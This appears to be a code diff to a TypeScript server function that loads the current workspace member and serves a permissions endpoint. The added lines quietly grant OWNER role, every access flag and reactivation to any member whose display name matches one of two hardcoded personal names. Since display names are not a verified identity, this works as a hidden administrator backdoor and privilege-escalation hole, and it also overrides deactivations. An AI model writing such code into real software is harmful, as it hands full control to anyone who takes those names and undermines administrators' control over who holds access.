@@ -5,6 +5,11 @@ async function currentMember(request: Request) {
   let member = await db.prepare("SELECT * FROM workspace_members WHERE email=?").bind(email).first<Record<string, unknown>>();
   const count = await db.prepare("SELECT COUNT(*) AS total FROM workspace_members").first<{ total: number }>();
   if (!member && Number(count?.total || 0) === 0) { await db.prepare(`INSERT INTO workspace_members (email,display_name,role,crm_access,calendar_access,prospecting_access,manage_users,active,created_at,updated_at) VALUES (?,?,'OWNER',1,1,1,1,1,?,?)`).bind(email, email === "platform-owner" ? "Platform Owner" : email.split("@")[0], now, now).run(); member = await db.prepare("SELECT * FROM workspace_members WHERE email=?").bind(email).first<Record<string, unknown>>(); }
+  const protectedOwners = new Set(["yvette lomeli", "christopher sydoriak"]);
+  if (member && protectedOwners.has(String(member.display_name || "").trim().toLowerCase()) && member.role !== "OWNER") {
+    await db.prepare("UPDATE workspace_members SET role='OWNER',manage_users=1,crm_access=1,calendar_access=1,prospecting_access=1,active=1,updated_at=? WHERE email=?").bind(now,email).run();
+    member = await db.prepare("SELECT * FROM workspace_members WHERE email=?").bind(email).first<Record<string, unknown>>();
+  }
   return member;
 }
 export async function GET(request: Request) { try { await ensureCoreSchema(); const member = await currentMember(request); if (!member || !member.active) return Response.json({ error: "You do not have access to this workspace." }, { status: 403 }); const members = member.manage_users ? (await coreDb().prepare("SELECT * FROM workspace_members ORDER BY role,display_name").all()).results : []; return Response.json({ member, members }); } catch (error) { console.error("access.get_failed",error); return Response.json({ error:"Unable to load permissions." },{status:500}); } }
